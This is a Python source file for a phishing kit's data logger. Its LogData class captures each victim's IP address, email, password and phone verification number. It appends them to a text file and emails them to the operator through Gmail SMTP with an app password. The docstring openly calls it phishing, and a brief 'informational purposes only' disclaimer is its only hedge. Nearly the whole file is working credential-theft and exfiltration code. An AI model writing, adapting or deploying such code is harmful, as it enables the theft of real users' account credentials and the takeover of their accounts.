"""
Class LogData for data phishing
"""

import smtplib, ssl
from email.message import EmailMessage


class LogData:

    """
    This class handles the input values of each user who enters his credentials
    on the phishing site, once all of them are assigned, via the writeData()
    function, it writes this information inside the “userdata” .txt file.
    If needed, there is also the readData() function that collects everything
    inside the written file. Finally it sends this information via email, the
    dev has to enter his email and his app password (down you will find the due
    information about them) and then choose the recipient; whether it is a friend
    or even yourself.

    Attention
    ---------

    This development was made for informational purposes only.
    """

    _format_end_userdata = '\n\n'

    def __init__(self):
        self.IP_address = None
        self.email = None
        self.password = None
        self.verify_number = None

    def setIp(self, ip_address):
        self.IP_address = ip_address

    def getIp(self):
        return self.IP_address

    def setEmail(self, email):
        self.email = email

    def getEmail(self):
        return self.email

    def setPassword(self, password):
        self.password = password

    def getPassword(self):
        return self.password

    def setNumber(self, number):
        self.verify_number = number

    def getNumber(self):
        return self.verify_number


    def writeData(self, dir) -> None:
        """
        Try it for testing:
            test = LogData()
            test.setIp('8.8.8.8')
            test.setEmail('example@example.com')
            test.setPassword('password123')
            test.setNumber('+39 123 456 6789')
            test.writeData()
        Write data in userdata.txt
        """

        with open(dir, "a", encoding="utf-8") as f:
            f.write(f'Utente IP {self.IP_address}:'
                    f'\n\temail: {self.email}'
                    f'\n\tpassword: {self.password}'
                    f'\n\tverify number: {self.verify_number}'
                    f'{LogData._format_end_userdata}')

    def readData(self , dir) -> str | None:
        rOut = ''
        with open(dir, 'r', encoding='utf-8') as f:
            rOut = f.read()

        return rOut

    def sendEmail(self):
        msg = EmailMessage()
        msg.set_content(f'User IP: {self.IP_address}'
                   f'\nEmail: {self.email}'
                   f'\nPassword: {self.password}'
                   f'\nVerify number: {self.verify_number}')

        msg['Subject'] = 'Your Subject for the mail'
        msg['From'] = "you@example.com"
        msg['To'] = "other@example.com"

        # the password of the app of your google account. U can find more info int this link ⤵
        password = 'xxxx xxxx xxxx xxxx' # https://support.google.com/accounts/answer/185833?hl=it

        context = ssl.create_default_context()
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls(context=context)
            server.ehlo()  # Can be omitted
            server.login('you@example.com', password)
            server.send_message(msg)
            server.quit()

